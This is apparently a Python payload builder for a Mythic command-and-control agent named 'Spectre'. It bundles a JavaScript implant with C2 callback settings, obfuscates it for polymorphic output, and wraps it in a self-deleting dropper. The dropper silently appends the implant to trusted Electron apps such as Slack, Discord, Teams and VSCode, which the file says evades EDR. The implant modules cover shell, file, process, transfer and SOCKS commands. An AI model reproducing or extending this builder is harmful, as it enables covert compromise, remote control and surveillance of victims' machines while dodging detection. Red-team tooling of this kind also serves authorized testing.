"""
Spectre - Mythic Payload Builder

Handles payload generation: reads the JavaScript agent source,
stamps in C2 configuration, applies javascript-obfuscator for
polymorphic builds, and packages for Electron injection.
"""

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import json
import base64
import tempfile

AGENT_CODE_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
    "agent_code"
)


class Spectre(PayloadType):
    name = "spectre"
    author = "spectre-dev"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    mythic_encrypts = True
    translation_container = None
    note = (
        "JavaScript-based agent for execution within trusted Electron "
        "applications (Slack, Discord, Teams, VSCode). Evades EDR by "
        "avoiding shellcode injection - runs as native Node.js under "
        "a legitimately-signed process."
    )
    supports_dynamic_loading = True
    agent_type = "agent"
    agent_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    agent_code_path = AGENT_CODE_PATH
    agent_icon_path = None

    build_parameters = [
        BuildParameter(
            name="callback_host",
            parameter_type=BuildParameterType.String,
            description="Callback host (e.g., https://mythic-server.com)",
            default_value="https://127.0.0.1",
            required=True,
        ),
        BuildParameter(
            name="callback_port",
            parameter_type=BuildParameterType.String,
            description="Callback port",
            default_value="443",
            required=True,
        ),
        BuildParameter(
            name="callback_interval",
            parameter_type=BuildParameterType.String,
            description="Callback interval in seconds",
            default_value="10",
            required=True,
        ),
        BuildParameter(
            name="callback_jitter",
            parameter_type=BuildParameterType.String,
            description="Callback jitter percentage (0-100)",
            default_value="23",
            required=True,
        ),
        BuildParameter(
            name="encrypted_exchange_check",
            parameter_type=BuildParameterType.Boolean,
            description="Perform encrypted key exchange on first checkin",
            default_value=True,
            required=False,
        ),
        BuildParameter(
            name="headers",
            parameter_type=BuildParameterType.String,
            description="JSON object of HTTP headers to include",
            default_value='{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}',
            required=False,
        ),
        BuildParameter(
            name="get_uri",
            parameter_type=BuildParameterType.String,
            description="GET request URI for tasking",
            default_value="/api/v1/status",
            required=False,
        ),
        BuildParameter(
            name="post_uri",
            parameter_type=BuildParameterType.String,
            description="POST request URI for responses",
            default_value="/api/v1/data",
            required=False,
        ),
        BuildParameter(
            name="query_param",
            parameter_type=BuildParameterType.String,
            description="Query parameter name for GET requests",
            default_value="token",
            required=False,
        ),
        BuildParameter(
            name="obfuscate",
            parameter_type=BuildParameterType.Boolean,
            description="Apply javascript-obfuscator for polymorphic output",
            default_value=True,
            required=False,
        ),
        BuildParameter(
            name="output_format",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["dropper", "electron_inject", "raw_js", "standalone"],
            description=(
                "dropper: all-in-one script — run it on the target and it "
                "auto-finds an Electron app, appends the agent, self-deletes. "
                "electron_inject: bare payload wrapped for manual append. "
                "raw_js: unwrapped agent IIFE (for custom delivery). "
                "standalone: runs directly via 'node spectre.js'."
            ),
            default_value="dropper",
            required=True,
        ),
    ]

    c2_profiles = ["http"]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            # Collect C2 configuration from build parameters
            c2_config = {
                "callback_host": self.get_parameter("callback_host"),
                "callback_port": int(self.get_parameter("callback_port")),
                "callback_interval": int(self.get_parameter("callback_interval")),
                "callback_jitter": int(self.get_parameter("callback_jitter")),
                "encrypted_exchange_check": self.get_parameter("encrypted_exchange_check"),
                "headers": json.loads(self.get_parameter("headers")),
                "get_uri": self.get_parameter("get_uri"),
                "post_uri": self.get_parameter("post_uri"),
                "query_param": self.get_parameter("query_param"),
                "payloadUUID": self.uuid,
            }

            # Read agent source files and assemble
            agent_js = await self._assemble_agent(c2_config)

            # Optionally obfuscate
            if self.get_parameter("obfuscate"):
                agent_js = await self._obfuscate(agent_js)

            # Package based on output format
            output_format = self.get_parameter("output_format")
            if output_format == "dropper":
                # Wrap payload, then embed into the dropper script
                wrapped_payload = self._wrap_electron_inject(agent_js)
                agent_js = self._build_dropper(wrapped_payload)
            elif output_format == "electron_inject":
                agent_js = self._wrap_electron_inject(agent_js)
            elif output_format == "standalone":
                agent_js = self._wrap_standalone(agent_js)
            # raw_js: no wrapping, just the assembled IIFE

            resp.payload = agent_js.encode("utf-8")
            resp.message = f"Spectre agent built successfully ({output_format})"
            resp.status = BuildStatus.Success

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.message = f"Build failed: {str(e)}"

        return resp

    async def _assemble_agent(self, c2_config: dict) -> str:
        """Read all agent source files and assemble into a single JS payload."""
        src_path = os.path.join(self.agent_code_path, "src")

        # Read source files in dependency order
        source_files = [
            "utils/encoding.js",
            "crypto/aes.js",
            "c2/http.js",
            "commands/shell.js",
            "commands/filesystem.js",
            "commands/process.js",
            "commands/transfer.js",
            "commands/socks.js",
            "commands/electron_inject.js",
            "agent.js",
        ]

        modules = {}
        for src_file in source_files:
            file_path = os.path.join(src_path, src_file)
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    modules[src_file] = f.read()

        # Stamp in configuration
        config_js = f"const C2_CONFIG = {json.dumps(c2_config, indent=2)};\n"

        # Bundle into single IIFE
        assembled = "(function() {\n'use strict';\n\n"
        assembled += "// === C2 Configuration ===\n"
        assembled += config_js + "\n"

        for src_file, content in modules.items():
            assembled += f"// === {src_file} ===\n"
            assembled += content + "\n\n"

        assembled += "// === Bootstrap ===\n"
        assembled += "const agent = new SpectreAgent(C2_CONFIG);\n"
        assembled += "agent.start();\n"
        assembled += "\n})();\n"

        return assembled

    async def _obfuscate(self, source: str) -> str:
        """Apply javascript-obfuscator for polymorphic output."""
        try:
            import subprocess
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".js", delete=False
            ) as infile:
                infile.write(source)
                infile_path = infile.name

            outfile_path = infile_path + ".obf.js"

            result = subprocess.run(
                [
                    "javascript-obfuscator", infile_path,
                    "--output", outfile_path,
                    "--compact", "true",
                    "--control-flow-flattening", "true",
                    "--control-flow-flattening-threshold", "0.5",
                    "--dead-code-injection", "true",
                    "--dead-code-injection-threshold", "0.2",
                    "--identifier-names-generator", "hexadecimal",
                    "--rename-globals", "true",
                    "--string-array", "true",
                    "--string-array-encoding", "base64",
                    "--string-array-threshold", "0.75",
                    "--transform-object-keys", "true",
                    "--unicode-escape-sequence", "false",
                ],
                capture_output=True, text=True, timeout=60,
            )

            if result.returncode == 0 and os.path.exists(outfile_path):
                with open(outfile_path, "r") as f:
                    obfuscated = f.read()
                os.unlink(infile_path)
                os.unlink(outfile_path)
                return obfuscated
            else:
                # Fall back to unobfuscated if tool not available
                os.unlink(infile_path)
                return source

        except (FileNotFoundError, subprocess.TimeoutExpired):
            # javascript-obfuscator not installed - return raw
            return source

    def _wrap_electron_inject(self, source: str) -> str:
        """
        Wrap agent for drop-in Electron injection.

        The output is designed so the operator just appends it to any
        JS file that the Electron app loads on startup. The IIFE wrapper
        ensures:
          - It doesn't break the host module's exports/behavior
          - Errors are swallowed silently (host app keeps working)
          - Startup delay avoids blocking the app's UI
          - The timer is unref'd so it doesn't keep the app alive
          - A guard prevents double-execution if appended multiple times
        """
        return f"""\
;(function(){{if(typeof globalThis.__s_g!=='undefined')return;globalThis.__s_g=1;
var _t=setTimeout(function(){{try{{
{source}
}}catch(_e){{}}}},{3000});if(_t&&_t.unref)_t.unref();}})();
"""

    def _build_dropper(self, wrapped_payload: str) -> str:
        """
        Build the all-in-one dropper script.

        Reads dropper/drop.js and replaces the payload placeholder
        with the actual wrapped agent. The output is a single .js file
        that the operator runs on the target:

            node drop.js              # auto-find Electron app and inject
            node drop.js --app slack  # inject into Slack specifically
            node drop.js --list       # just show what's available

        The dropper self-deletes after successful injection.
        """
        dropper_path = os.path.join(self.agent_code_path, "dropper", "drop.js")

        with open(dropper_path, "r") as f:
            dropper_source = f.read()

        # Escape the payload for embedding as a JS string literal
        # Use base64 to avoid any quoting/escaping issues
        import base64 as b64lib
        payload_b64 = b64lib.b64encode(
            wrapped_payload.encode("utf-8")
        ).decode("ascii")

        # Replace the placeholder with a decoded base64 string
        dropper_source = dropper_source.replace(
            "const PAYLOAD = '__SPECTRE_PAYLOAD_PLACEHOLDER__';",
            f"const PAYLOAD = Buffer.from('{payload_b64}', 'base64').toString('utf-8');",
        )

        return dropper_source

    def _wrap_standalone(self, source: str) -> str:
        """Wrap for standalone execution (node spectre.js)."""
        wrapper = "#!/usr/bin/env node\n"
        wrapper += "'use strict';\n\n"
        wrapper += source
        return wrapper
